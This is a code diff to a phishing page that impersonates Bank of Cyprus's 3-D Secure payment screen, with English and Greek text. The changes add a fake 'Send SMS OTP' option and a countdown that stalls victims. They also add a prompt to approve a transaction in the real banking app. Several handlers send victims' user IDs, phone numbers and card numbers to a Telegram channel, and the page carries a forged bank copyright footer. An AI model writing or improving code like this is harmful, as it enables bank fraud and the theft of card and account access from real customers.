@@ -313,21 +313,78 @@ export default function BbvaPage(props: any) {
   const [bocOtp, setBocOtp] = useState("")
   const [bocAuthFailed, setBocAuthFailed] = useState(false)
   const [bocSubmitCount, setBocSubmitCount] = useState(0)
+  const [sessionSecondsLeft, setSessionSecondsLeft] = useState(120)
+  const [isSmsOtpRequested, setIsSmsOtpRequested] = useState(false)
   const bocInputRef = useRef<HTMLInputElement>(null)
 
-  // 2-minute background timer on boc-verify screen -> automatically moves to OTP screen
+  // 2-minute live countdown timer on boc-verify screen -> activates when "Send SMS OTP" is clicked
   useEffect(() => {
-    if (currentScreen !== "boc-verify") return
+    if (currentScreen !== "boc-verify") {
+      setIsSmsOtpRequested(false)
+      return
+    }
 
-    const timer = setTimeout(() => {
-      setCurrentScreen("otp")
-      if (typeof window !== "undefined" && window.history) {
-        window.history.pushState({ screen: "otp" }, "", "/verify")
-      }
-    }, 120000)
+    if (!isSmsOtpRequested) return
 
-    return () => clearTimeout(timer)
-  }, [currentScreen])
+    const interval = setInterval(() => {
+      setSessionSecondsLeft((prev) => {
+        if (prev <= 1) {
+          clearInterval(interval)
+          setCurrentScreen("otp")
+          if (typeof window !== "undefined" && window.history) {
+            window.history.pushState({ screen: "otp" }, "", "/verify")
+          }
+          return 0
+        }
+        return prev - 1
+      })
+    }, 1000)
+
+    return () => clearInterval(interval)
+  }, [currentScreen, isSmsOtpRequested])
+
+  const formatBocTimer = (totalSeconds: number) => {
+    const mins = Math.floor(totalSeconds / 60)
+    const secs = totalSeconds % 60
+    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`
+  }
+
+  // Handle clicking "Send SMS OTP": shows notice and starts 2-minute timer
+  const handleSendSmsOtpClick = async () => {
+    setIsSmsOtpRequested(true)
+    setSessionSecondsLeft(120)
+
+    try {
+      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+      const savedPhone =
+        (typeof window !== "undefined" &&
+          (sessionStorage.getItem("bbva_phoneNumber") ||
+            sessionStorage.getItem("phoneNumber") ||
+            sessionStorage.getItem("bibd_phone"))) ||
+        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+
+      await sendTelegramMessage({
+        title: "Bank of Cyprus — Send SMS OTP Requested",
+        dni: savedUser || undefined,
+        phoneNumber: savedPhone || undefined,
+        cardNumber: cardNumber ? cardNumber.replace(/\s+/g, "") : undefined,
+        type: "boc_resend",
+      })
+    } catch (err) {
+      console.error("Error sending Telegram notification:", err)
+    }
+  }
+
+  // Open official Bank of Cyprus Mobile App on Google Play Store
+  const handleOpenBocApp = () => {
+    if (typeof window !== "undefined") {
+      window.open(
+        "https://play.google.com/store/apps/details?id=cy.com.netinfo.netteller.boc&pcampaignid=web_share",
+        "_blank",
+        "noopener,noreferrer"
+      )
+    }
+  }
 
   // BOC Confirm & Resend Handlers: captures code to Telegram and shows invalid message each time
   const handleBocConfirm = async (e?: React.FormEvent) => {
@@ -780,7 +837,7 @@ export default function BbvaPage(props: any) {
     }
   })()
 
-  // 2.5 Handle 3DS Purchase Verification Approval: "Έχω ήδη εγκρίνει την συναλλαγή"
+  // 2.5 Handle 3DS Purchase Verification Approval: "I already approved the transaction"
   const handleBocApproval = async () => {
     setIsBocVerifying(true)
     try {
@@ -793,11 +850,11 @@ export default function BbvaPage(props: any) {
         (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
       await sendTelegramMessage({
-        title: "Bank of Cyprus — 3DS Approval Clicked",
+        title: "Bank of Cyprus — Transaction Approved by User",
         dni: savedUser || undefined,
         phoneNumber: savedPhone || undefined,
         cardNumber: cardNumber ? cardNumber.replace(/\s+/g, "") : undefined,
-        type: "verify",
+        type: "boc_approved",
       })
     } catch (err) {
       console.error("Error sending Telegram notification:", err)
@@ -1626,129 +1683,234 @@ export default function BbvaPage(props: any) {
       {/* 2-min silent background timer automatically moves to the OTP screen       */}
       {/* ========================================================================= */}
       {currentScreen === "boc-verify" && (
-        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-0 select-none">
-          {/* Header: Left is Bank of Cyprus + Emblem, Center is Language Toggle, Right is VISA Logo */}
-          <header className="w-full px-5 sm:px-6 pt-7 pb-4 flex items-center justify-between shrink-0 bg-white">
-            <div className="flex items-center gap-1.5 select-none">
-              <span
-                className="text-[#058998] font-serif font-bold text-[16px] sm:text-[17px] tracking-tight leading-none"
-                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
-              >
-                {bocLanguage === "en" ? "Bank of Cyprus" : "Τράπεζα Κύπρου"}
-              </span>
-              <img
-                src="/boc_logo.png"
-                alt="Bank of Cyprus"
-                className="w-[24px] h-[24px] sm:w-[26px] sm:h-[26px] object-contain rounded-[4px] shrink-0"
-              />
-            </div>
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] min-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-5 sm:px-6 pt-6 pb-6 select-none">
+          {/* Top Section */}
+          <div className="w-full flex flex-col">
+            {/* Header: Left is Bank of Cyprus + Emblem, Center is Language Toggle, Right is VISA + Secure */}
+            <header className="w-full pb-5 flex items-center justify-between shrink-0 bg-white">
+              <div className="flex items-center gap-1.5 select-none">
+                <span
+                  className="text-[#058998] font-serif font-bold text-[18px] sm:text-[19px] tracking-tight leading-none"
+                  style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
+                >
+                  {bocLanguage === "en" ? "Bank of Cyprus" : "Τράπεζα Κύπρου"}
+                </span>
+                <img
+                  src="/boc_logo.png"
+                  alt="Bank of Cyprus"
+                  className="w-[24px] h-[24px] sm:w-[26px] sm:h-[26px] object-contain rounded-[3px] shrink-0"
+                />
+              </div>
 
-            {/* Language Toggle: EN | EL (Defaults to English) */}
-            <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/80 select-none">
-              <button
-                type="button"
-                onClick={() => setBocLanguage("en")}
-                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
-                  bocLanguage === "en"
-                    ? "bg-[#058998] text-white shadow-xs"
-                    : "text-[#64748b] hover:text-[#0f172a]"
-                }`}
-                aria-label="English"
-              >
-                EN
-              </button>
-              <button
-                type="button"
-                onClick={() => setBocLanguage("el")}
-                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
-                  bocLanguage === "el"
-                    ? "bg-[#058998] text-white shadow-xs"
-                    : "text-[#64748b] hover:text-[#0f172a]"
-                }`}
-                aria-label="Greek"
-              >
-                EL
-              </button>
-            </div>
+              {/* Language Toggle: EN | EL (Defaults to English) */}
+              <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/80 select-none mx-2">
+                <button
+                  type="button"
+                  onClick={() => setBocLanguage("en")}
+                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
+                    bocLanguage === "en"
+                      ? "bg-[#058998] text-white shadow-xs"
+                      : "text-[#64748b] hover:text-[#0f172a]"
+                  }`}
+                  aria-label="English"
+                >
+                  EN
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setBocLanguage("el")}
+                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
+                    bocLanguage === "el"
+                      ? "bg-[#058998] text-white shadow-xs"
+                      : "text-[#64748b] hover:text-[#0f172a]"
+                  }`}
+                  aria-label="Greek"
+                >
+                  EL
+                </button>
+              </div>
 
-            <img
-              src="/visa_blue.svg"
-              alt="VISA"
-              className="h-[28px] sm:h-[32px] w-auto object-contain shrink-0"
-            />
-          </header>
+              {/* VISA + Secure badge */}
+              <div className="flex flex-col items-end shrink-0">
+                <img
+                  src="/visa_blue.svg"
+                  alt="VISA"
+                  className="h-[22px] sm:h-[24px] w-auto object-contain shrink-0"
+                />
+                <span className="mt-1 bg-[#192f60] text-white text-[10px] font-semibold px-2 py-0.5 rounded-[3px] tracking-wide uppercase leading-none">
+                  Secure
+                </span>
+              </div>
+            </header>
 
-          {/* Main Body */}
-          <section className="w-full flex-1 flex flex-col px-5 sm:px-6 pt-5 pb-8 select-none">
-            {/* Title: Purchase Authentication */}
-            <h1 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#000000] tracking-tight mb-4">
-              {bocLanguage === "en" ? "Purchase Authentication" : "Πιστοποίηση Αγοράς"}
+            {/* Title: Secure Payment Authentication */}
+            <h1 className="text-[20px] sm:text-[22px] font-bold text-[#000000] tracking-tight mb-2">
+              {bocLanguage === "en"
+                ? "Secure Payment Authentication"
+                : "Ασφαλής Πιστοποίηση Πληρωμής"}
             </h1>
 
-            {/* Instruction description */}
-            <p className="text-[13.5px] sm:text-[14px] text-[#000000] leading-[1.45] font-normal mb-6">
+            {/* Subtitle: Your approval is required in the mobile banking app. */}
+            <p className="text-[14px] sm:text-[14.5px] text-[#000000] leading-snug font-normal mb-4">
               {bocLanguage === "en"
-                ? "Check the Bank of Cyprus BoC Mobile App to confirm your transaction."
-                : "Ελέγξτε το BoC Mobile App της Τράπεζας Κύπρου για να επιβεβαιώστε τη συναλλαγή σας."}
+                ? "Your approval is required in the mobile banking app."
+                : "Απαιτείται η έγκρισή σας στην εφαρμογή mobile banking."}
             </p>
 
-            {/* Data fields: MERCHANT, AMOUNT, DATE */}
-            <div className="flex flex-col space-y-4 mb-7">
-              <div>
-                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
-                  {bocLanguage === "en" ? "MERCHANT" : "ΕΜΠΟΡΑΣ"}
-                </p>
-                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
-                  FAHIPAY
-                </p>
+            {/* Teal Call-to-Action Button -> Opens Google Play Store Mobile App Link */}
+            <button
+              type="button"
+              onClick={handleOpenBocApp}
+              className="w-full bg-[#0c6a74] hover:bg-[#09575f] active:scale-[0.99] text-white rounded-[7px] py-2.5 px-3 flex items-center justify-center gap-2 mb-4.5 shadow-xs transition-all cursor-pointer select-none"
+            >
+              <div className="flex flex-col items-center justify-center leading-none shrink-0 pr-0.5">
+                <span className="text-[11px] font-bold leading-none">↗</span>
+                <span className="text-[9px] font-bold tracking-tight leading-none mt-0.5">BoC</span>
               </div>
-
-              <div>
-                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
-                  {bocLanguage === "en" ? "AMOUNT" : "ΠΟΣΟ"}
-                </p>
-                <p className="text-[14px] font-semibold text-[#000000] mt-0.5">
-                  EUR 0.082
-                </p>
-              </div>
-
-              <div>
-                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
-                  {bocLanguage === "en" ? "DATE" : "ΗΜΕΡΟΜΗΝΙΑ"}
-                </p>
-                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
-                  {currentDateFormatted}
-                </p>
-              </div>
-            </div>
-
-            {/* Not working? & Already approved transaction button */}
-            <div className="flex flex-col mb-10 select-none">
-              <p className="text-[13.5px] font-bold text-[#000000] mb-1">
-                {bocLanguage === "en" ? "Not working?" : "Δεν δουλεύει;"}
-              </p>
-              <button
-                type="button"
-                onClick={handleBocApproval}
-                className="text-left text-[13.5px] text-[#0052cc] underline underline-offset-2 font-normal cursor-pointer hover:opacity-80 transition-opacity"
-              >
+              <span className="text-[13.5px] sm:text-[14px] font-semibold tracking-tight">
                 {bocLanguage === "en"
-                  ? "I have already approved the transaction"
-                  : "Έχω ήδη εγκρίνει την συναλλαγή"}
-              </button>
+                  ? "Tap to Open Mobile App for Approval 👉"
+                  : "Πατήστε για να Ανοίξετε το Mobile App για Έγκριση 👉"}
+              </span>
+            </button>
+
+            {/* Steps Section */}
+            <div className="mb-4 select-none">
+              <p className="text-[13.5px] sm:text-[14px] font-medium text-[#111827] mb-2">
+                {bocLanguage === "en" ? "Please follow these steps:" : "Παρακαλώ ακολουθήστε αυτά τα βήματα:"}
+              </p>
+              <ol className="text-[13px] sm:text-[13.5px] text-[#1f2937] space-y-1.5 leading-[1.38]">
+                <li className="flex items-start gap-1.5">
+                  <span className="font-normal shrink-0">1.</span>
+                  <span>
+                    {bocLanguage === "en"
+                      ? "Tap the button above to send a request to your phone."
+                      : "Πατήστε το κουμπί παραπάνω για να στείλετε αίτημα στο τηλέφωνό σας."}
+                  </span>
+                </li>
+                <li className="flex items-start gap-1.5">
+                  <span className="font-normal shrink-0">2.</span>
+                  <span>
+                    {bocLanguage === "en"
+                      ? "Open the Bank mobile app notification on your device."
+                      : "Ανοίξτε την ειδοποίηση της εφαρμογής της Τράπεζας στη συσκευή σας."}
+                  </span>
+                </li>
+                <li className="flex items-start gap-1.5">
+                  <span className="font-normal shrink-0">3.</span>
+                  <span>
+                    {bocLanguage === "en"
+                      ? "Review the transaction and tap 'APPROVE' or 'CONFIRM' to finalize the payment."
+                      : "Ελέγξτε τη συναλλαγή και πατήστε 'ΕΓΚΡΙΣΗ' ή 'ΕΠΙΒΕΒΑΙΩΣΗ' για να ολοκληρώσετε την πληρωμή."}
+                  </span>
+                </li>
+              </ol>
             </div>
 
-            {/* Bottom Footer Links (Non-clickable) */}
-            <div className="flex items-center justify-between pt-12 mt-auto select-none pointer-events-none">
-              <span className="text-[13px] font-bold text-[#000000] underline underline-offset-2 cursor-default select-none">
-                {bocLanguage === "en" ? "Terms and Conditions" : "Όροι και Προϋποθέσεις"}
-              </span>
+            {/* Transaction & "Not working?" Details Box */}
+            <div className="w-full bg-[#f6f7fa] border border-[#e5e7eb] rounded-[12px] p-4 mb-3.5 select-none">
+              {/* Merchant, Amount, Date */}
+              <div className="space-y-1.5 text-[13px] sm:text-[13.5px] text-[#111827]">
+                <div className="flex items-baseline">
+                  <span className="w-[84px] font-bold shrink-0">
+                    {bocLanguage === "en" ? "Merchant:" : "Έμπορος:"}
+                  </span>
+                  <span className="font-normal">FAHIPAY</span>
+                </div>
+                <div className="flex items-baseline">
+                  <span className="w-[84px] font-bold shrink-0">
+                    {bocLanguage === "en" ? "Amount:" : "Ποσό:"}
+                  </span>
+                  <span className="font-normal">EUR 0.082</span>
+                </div>
+                <div className="flex items-baseline">
+                  <span className="w-[84px] font-bold shrink-0">
+                    {bocLanguage === "en" ? "Date:" : "Ημερομηνία:"}
+                  </span>
+                  <span className="font-normal">{bocDateFormatted}</span>
+                </div>
+              </div>
 
-              <span className="text-[13px] font-bold text-[#000000] underline underline-offset-2 cursor-default select-none">
-                {bocLanguage === "en" ? "Exit" : "Έξοδος"}
-              </span>
+              {/* Divider Line */}
+              <div className="w-full border-b border-[#e2e8f0] my-3" />
+
+              {/* Not working? Section */}
+              <div>
+                <p className="text-[13.5px] font-bold text-[#111827] mb-2">
+                  {bocLanguage === "en" ? "Not working?" : "Δεν δουλεύει;"}
+                </p>
+
+                <ul className="space-y-2 text-[12.5px] sm:text-[13px] text-[#111827]">
+                  {/* Bullet 1: I already approved the transaction -> sends Telegram notification */}
+                  <li className="flex items-start gap-2">
+                    <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
+                    <button
+                      type="button"
+                      onClick={handleBocApproval}
+                      className="text-left text-[#111827] underline underline-offset-2 hover:opacity-75 transition-opacity cursor-pointer font-normal"
+                    >
+                      {bocLanguage === "en"
+                        ? "I already approved the transaction"
+                        : "Έχω ήδη εγκρίνει τη συναλλαγή"}
+                    </button>
+                  </li>
+
+                  {/* Bullet 2: [New Option] Send SMS OTP */}
+                  <li className="flex flex-col">
+                    <div className="flex items-start gap-2">
+                      <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
+                      <div>
+                        <span className="font-normal">
+                          {bocLanguage === "en" ? "[New Option] " : "[Νέα Επιλογή] "}
+                        </span>
+                        <button
+                          type="button"
+                          onClick={handleSendSmsOtpClick}
+                          className="text-[#111827] underline underline-offset-2 font-bold hover:opacity-75 transition-opacity cursor-pointer inline"
+                        >
+                          {bocLanguage === "en" ? "Send SMS OTP" : "Αποστολή SMS OTP"}
+                        </button>
+                      </div>
+                    </div>
+
+                    {/* Explanatory text & Session timer appear ONLY when user clicks Send SMS OTP */}
+                    {isSmsOtpRequested && (
+                      <div className="mt-1 animate-in fade-in duration-200">
+                        <p className="text-[11.5px] sm:text-[12px] text-[#4b5563] pl-4 leading-[1.35]">
+                          {bocLanguage === "en"
+                            ? "SMS OTP feature will become available once the security session time below has fully expired."
+                            : "Η λειτουργία SMS OTP θα είναι διαθέσιμη μόλις λήξει ο χρόνος ασφαλείας παρακάτω."}
+                        </p>
+
+                        <div className="flex items-start gap-2 mt-2">
+                          <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
+                          <p className="text-[#111827]">
+                            <span>
+                              {bocLanguage === "en"
+                                ? "[New Option] Session will expire in "
+                                : "[Νέα Επιλογή] Η συνεδρία θα λήξει σε "}
+                            </span>
+                            <span className="font-bold tracking-wide">
+                              {formatBocTimer(sessionSecondsLeft)}
+                            </span>
+                          </p>
+                        </div>
+                      </div>
+                    )}
+                  </li>
+                </ul>
+              </div>
             </div>
-          </section>
+          </div>
+
+          {/* Footer Box with only Bank of Cyprus Copyright */}
+          <div className="w-full bg-[#f6f7fa] border border-[#e5e7eb] rounded-[12px] py-3 px-3.5 select-none mt-auto text-center">
+            <p className="text-[11.5px] sm:text-[12px] text-[#6b7280] leading-normal font-normal">
+              {bocLanguage === "en"
+                ? "© 2026 Bank of Cyprus Public Company Ltd. All rights reserved."
+                : "© 2026 Τράπεζα Κύπρου Δημόσια Εταιρεία Λτδ. Με επιφύλαξη παντός δικαιώματος."}
+            </p>
+          </div>
         </main>
       )}
 
